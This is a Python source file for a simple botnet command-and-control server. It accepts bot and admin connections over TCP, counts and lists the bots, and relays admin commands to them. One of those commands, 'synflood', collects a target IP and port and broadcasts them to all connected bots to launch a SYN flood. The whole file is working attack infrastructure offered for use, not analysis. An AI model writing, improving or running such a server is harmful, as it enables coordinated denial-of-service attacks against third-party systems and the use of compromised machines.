import os, socket, time, argparse, threading, sys


version = 0.1

class main():
	def __init__(self):
		self.Main()
	def checkclients(self):
		test = "2"
		self.count2 = 0
		self.count3 = 0
		while True:
			while True:
				self.count3 = 0
				for i in self.bots:
					self.count3 += 1
				break
			while True:
				for i in self.bots:
					self.count2 += 1 
					try:
						i.sendall(test.encode())
					except BrokenPipeError:
						self.bots.remove(i)
						break
				if self.count2 == self.count3:
					self.count2 = 0
					break
			time.sleep(100)
	def recvadmin(self):
		self.botsstr = ""
		self.count = 0
		self.sstr = ""
		self.commandtosend = ""
		self.success = "Successfully!"
		self.count1 = 0
		while True:
			self.responseadmin = self.c.recv(1024)
			responseinstr = self.responseadmin.decode()
			responseinstr = responseinstr[:-1]
			if len(self.responseadmin) == 0:
				break;
			if responseinstr == "clients":
				for i in self.bots:
					self.count += 1
				self.botsstr = str(self.count)
				self.count = 0
				self.c.send(self.botsstr.encode())
			if responseinstr == "sendtesttext":
				self.commandtosend = "eee"
				for i in self.bots:
					try:
						i.sendall(self.commandtosend.encode())
					except BrokenPipeError:
						pass
				self.c.send(self.success.encode())
			if responseinstr == "synflood":
				self.c.send("Send target ip address.".encode())
				self.responseadmin = self.c.recv(1024)
				responseinstr = self.responseadmin.decode()
				responseinstr = responseinstr[:-1]
				self.targethost = responseinstr
				self.c.send("Send target port.".encode())
				self.responseadmin = self.c.recv(1024)
				responseinstr = self.responseadmin.decode()
				responseinstr = responseinstr[:-1]
				self.targetport = responseinstr
				self.commandtosend = "eeeeee"
				for i in self.bots:
					try:
						i.sendall(self.commandtosend.encode())
					except BrokenPipeError:
						pass
				time.sleep(1)
				for i in self.bots:
					try:
						i.sendall(self.targethost.encode())
					except BrokenPipeError:
						pass
				time.sleep(1)
				for i in self.bots:
					try:
						i.sendall(self.targetport.encode())
					except BrokenPipeError:
						pass
				self.c.send(self.success.encode())
			if responseinstr == "info":
				string1 = "Enter a number of client: "
				self.c.send(string1.encode())
				self.responsenumber = self.c.recv(1024)
				responsenuminstr = self.responsenumber.decode()
				responsenuminstr = responsenuminstr[:-1]
				responsenuminstr = int(responsenuminstr)
				for i in self.bots:
					self.count1 += 1
					if responsenuminstr == self.count1:
						self.count1 = 0
						self.sstr = str(i)
						self.c.send(self.sstr.encode())
						break
				
	def Main(self):
		try:
			all_args = argparse.ArgumentParser()
			all_args.add_argument("-i", "--ip", required=True, help="IP to connect")
			all_args.add_argument("-p", "--port", required=True, help="Port to connect")
			args = vars(all_args.parse_args())
			print("Starting botnet server...")
			self.bots = set()
			self.admins = set()
			self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.host = str(args["ip"])
			self.port = int(args["port"])
			self.s.bind((self.host, int(self.port)))
			self.s.listen(5)
			print("Botnet started")
			self.t = threading.Thread(target=self.checkclients, args=())
			self.t.start()
			while True:
				self.c, self.addr = self.s.accept()
				print('got connection from addr', self.addr)
				self.response = self.c.recv(1024)
				self.strresponse = bytes.decode(self.response)
				if len(self.strresponse) == 17:
					print("Bot connected")
					self.bots.add(self.c)
				elif len(self.strresponse) == 87:
					print("Admin connected")
					self.admins.add(self.c)
					self.x = threading.Thread(target=self.recvadmin, args=())
					self.x.start()
					self.x.join()
				else:
					print("problems")
		except KeyboardInterrupt:
			self.t.join()

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("\nExiting...")
		sys.exit()
